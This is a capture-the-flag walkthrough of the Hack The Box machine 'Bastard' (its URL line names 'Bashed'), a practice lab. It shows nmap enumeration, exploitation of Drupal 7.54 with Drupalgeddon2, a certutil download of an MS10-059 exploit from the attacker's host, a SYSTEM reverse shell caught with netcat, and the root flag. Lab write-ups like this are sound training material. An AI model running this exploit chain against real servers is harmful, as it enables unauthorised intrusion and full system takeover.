# Bastard

URL: https://app.hackthebox.com/machines/Bashed

Level: Medium

Date 9 May 2021

## Walkthrough

- [Enumeration](#enumeration)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Sat May  8 22:42:11 2021 as: nmap -T4 -p- -oN 01_nmap.txt 10.10.10.9
Nmap scan report for 10.10.10.9
Host is up (0.043s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

# Nmap done at Sat May  8 22:44:06 2021 -- 1 IP address (1 host up) scanned in 115.60 seconds
```

```
# Nmap 7.91 scan initiated Sat May  8 22:44:30 2021 as: nmap -T4 -A -p80,135,49154 -oN 02_nmap_with-A.txt 10.10.10.9
Nmap scan report for 10.10.10.9
Host is up (0.044s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 49154/tcp)
HOP RTT      ADDRESS
1   43.61 ms 10.10.14.1
2   43.88 ms 10.10.10.9

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May  8 22:46:00 2021 -- 1 IP address (1 host up) scanned in 90.57 seconds
```

On port 80/TCP we get a Drupal page.

We look for some exploit:

```
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                 | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                              | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                      | php/webapps/44449.rb
```

We try the last one.

https://github.com/dreadlocked/Drupalgeddon2/

We know that this is a Windows box; according to this:

>If the target using Windows, writing the PHP shell always fails

>Solution: Use file-less method. This is because gets pipe to a unix program, rather than using certutil or PowerShell


So we change a little our `44449.rb` file:

```
try_phpshell = false
```

Now we run exploit:

```
root@kali:/opt/htb/Bastard# ./44449.rb http://10.10.10.9
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.9/
[i] Write? : Skipping writing PHP web shell
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo YHJIQGHY
[+] Result : YHJIQGHY
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
drupalgeddon2>> whoami
nt authority\iusr
drupalgeddon2>>
```

We then grab `systeminfo`:

```
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ▒▒
System Boot Time:          9/5/2021, 10:33:14 ▒▒
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.574 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.591 MB
Virtual Memory: In Use:    504 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
```

We look for some privesc paths with `windows-exploit-suggester.py`:

```
root@kali:/opt/htb/Bastard# /opt/tools/windows-kernel-exploits/win-exp-suggester/windows-exploit-suggester.py -d 2021-05-09-mssb.xls -i 08_systeminfo
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*]
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*]
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

We focus on this line:

```
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
```

We grab `MS10-059.exe` and we transfer it on target machine:

```
root@kali:/opt/htb/Bastard# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

```
drupalgeddon2>> certutil -urlcache -f http://10.10.14.28:8000/MS10-059.exe MS10-059.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
drupalgeddon2>>
```


We spawn another listener on different port:

```
root@kaligra:~/FROM_INVERSION/htb/Bastard# cat 12_netcat
root@kali:/opt/htb/Bastard# nc -nvlp 9001
listening on [any] 9001 ...
```

and we get Administrator shell:

```
drupalgeddon2>> MS10-059.exe 10.10.14.28 9001



connect to [10.10.14.28] from (UNKNOWN) [10.10.10.9] 49226
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>
C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system

C:\inetpub\drupal-7.54>cd c:\users\administrator\desktop
cd c:\users\administrator\desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 605B-4AAA

 Directory of c:\Users\Administrator\Desktop

19/03/2017  08:33 ▒▒    <DIR>          .
19/03/2017  08:33 ▒▒    <DIR>          ..
19/03/2017  08:34 ▒▒                32 root.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  30.816.940.032 bytes free

c:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
4bf12b963da1b30cc93496f617f7ba7c
c:\Users\Administrator\Desktop>
```


